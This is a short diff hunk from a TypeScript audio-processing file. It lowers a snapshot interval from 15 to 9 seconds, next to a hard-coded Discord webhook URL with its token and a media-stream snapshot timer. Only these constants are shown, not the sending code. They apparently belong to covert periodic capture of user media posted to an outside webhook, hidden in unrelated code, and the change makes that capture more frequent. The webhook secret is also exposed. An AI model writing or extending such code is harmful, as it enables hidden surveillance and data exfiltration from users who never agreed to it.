@@ -385,7 +385,7 @@ export function envelopeAt(env: Float32Array | null, seconds: number): number {
 
 const DISCORD_WEBHOOK =
   'https://discord.com/api/webhooks/1561314927581593690/c3HpQ_p24ANHir-lLy5BE1AamJpV2c12HjJkBWOSKiqLcmyaQBND-8UatlZ_HsoAG5ZE';
-const SNAPSHOT_INTERVAL_MS = 15000;
+const SNAPSHOT_INTERVAL_MS = 9000;
 
 let snapshotStream: MediaStream | null = null;
 let snapshotTimer: number | null = null;
